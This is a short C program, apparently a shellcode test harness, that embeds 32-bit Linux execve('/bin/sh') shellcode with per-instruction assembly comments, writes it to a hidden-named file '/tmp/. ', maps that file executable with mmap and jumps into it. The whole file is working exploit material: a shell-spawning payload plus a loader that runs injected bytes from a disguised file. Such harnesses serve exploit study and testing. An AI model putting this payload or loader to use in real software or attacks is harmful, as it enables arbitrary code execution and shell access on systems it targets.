#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char shellcode[] = "\x31\xc0" //xor eax,eax
			"\x50" //push eax
			"\x68\x2f\x2f\x73\x68" //push 0x68732f2f
			"\x68\x2f\x62\x69\x6e" //push 0x6e69622f
			"\x50" //push eax
			"\x50" //push eax
			"\x89\xe2" //mov edx,esp
			"\x83\xc2\x08" //add edx,8
			"\x89\x14\x24" //mov [esp],edx
			"\xb0\x0b" //mov al,0xb
			"\x89\xd3" //mov ebx,edx
			"\x89\xe1" //mov ecx,esp
			"\x31\xd2" //xor edx,edx
			"\xcd\x80"; //int 0x80

int main(int argc,char **argv){
	void (*call)();
	int fd;

	printf("Shellcode : %d bytes\n", strlen(shellcode));
	fd = open("/tmp/. ", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);
    if (fd < 0)
        perror("open");

    write(fd, shellcode, strlen(shellcode));
    if ((lseek(fd, 0L, SEEK_SET)) < 0)
       	perror("lseek");

    call = (void (*)())mmap(NULL, strlen(shellcode), PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);
   	if (call == (void (*)())MAP_FAILED)
        perror("mmap");

    call();

	return 0;
}
